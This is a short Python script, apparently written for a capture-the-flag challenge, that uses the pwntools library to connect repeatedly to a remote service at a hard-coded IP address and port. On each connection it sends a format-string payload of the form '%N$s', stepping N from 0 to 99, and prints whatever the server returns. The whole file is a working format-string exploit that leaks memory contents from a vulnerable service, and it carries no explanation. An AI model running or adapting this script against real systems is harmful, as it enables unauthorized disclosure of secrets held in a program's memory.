from pwn import *

#elf = context.binary = ELF('./format_vuln', checksec=False)

for i in range(100):
    try:
        p = remote('64.226.75.15',6010)
        p.recvline()
        p.clean()
        p.sendline('%{}$s'.format(i).encode())
        result = p.recvline()
        try:
            print(str(result.replace(b"\n",b"").decode()))
        except:
            pass
        p.close()
    except EOFError:
        pass
